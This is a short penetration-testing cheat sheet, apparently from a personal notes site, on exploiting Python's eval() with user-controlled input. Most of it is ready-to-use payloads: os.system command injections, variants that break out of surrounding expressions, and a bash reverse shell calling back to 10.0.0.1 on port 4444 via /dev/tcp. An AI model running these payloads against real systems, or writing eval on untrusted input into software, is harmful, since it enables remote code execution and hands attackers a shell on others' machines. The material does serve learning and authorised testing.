---
title: Python Eval Code Execution
description: Python's eval() method is vulnerable to arbitrary code execution.
tags:
    - Linux
    - Privilege Escalation
    - Web
refs:
date: 2023-04-11
draft: false
---

## Investigation

```py
eval(text)
eval(f"5 + {num}")
```

If the Python script allows us to input some value to the **"text"** variable, we can inject arbitrary code.

<br />

## Arbitrary Code Execution

Most of the time, we need to bypass another expression to execute our desired command.

```html
__import__('os').system('id')

<!-- Bypass another expression in eval -->
),__import__('os').system('id')
'),__import__('os').system('id')
},__import__('os').system('id')
),__import__('os').system('id')#
```

### Reverse Shell

```html
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
```